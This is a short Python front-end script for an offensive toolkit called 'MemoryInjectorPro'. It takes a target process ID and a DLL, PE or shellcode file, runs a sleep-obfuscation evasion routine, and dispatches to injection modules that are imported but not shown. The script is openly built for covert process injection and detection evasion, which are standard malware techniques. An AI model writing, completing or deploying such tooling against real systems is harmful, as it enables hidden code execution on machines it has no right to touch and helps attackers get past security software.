#!/usr/bin/env python3
import argparse
from modules import dll_injector, pe_reflective, shellcode_loader, evasion

def main():
    parser = argparse.ArgumentParser(description="MemoryInjectorPro - Advanced Injection Toolkit")
    parser.add_argument("--mode", choices=["dll", "pe", "shellcode"], required=True, help="Injection type")
    parser.add_argument("--pid", type=int, required=True, help="Target process ID")
    parser.add_argument("--path", type=str, help="Path to DLL or PE file")
    parser.add_argument("--shellcode", type=str, help="Path to raw shellcode file")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    evasion.sleep_obfuscate()

    if args.mode == "dll":
        dll_injector.inject_dll(args.pid, args.path, args.verbose)
    elif args.mode == "pe":
        pe_reflective.inject_pe(args.pid, args.path, args.verbose)
    elif args.mode == "shellcode":
        shellcode_loader.inject_shellcode(args.pid, args.shellcode, args.verbose)

if __name__ == "__main__":
    main()
